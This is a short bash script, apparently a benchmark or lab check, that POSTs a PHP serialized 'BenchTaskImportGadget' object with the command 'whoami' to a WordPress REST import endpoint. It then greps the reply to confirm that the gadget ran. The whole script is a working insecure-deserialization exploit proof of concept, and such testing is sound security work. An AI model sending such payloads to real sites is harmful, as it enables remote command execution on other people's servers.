#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
printf "O:21:\"BenchTaskImportGadget\":1:{s:7:\"command\";s:6:\"whoami\";}" | curl -s -X POST "$TARGET/wp-json/bench-tasks/v1/import" --data-binary @- | grep -q "gadget-ran:whoami"
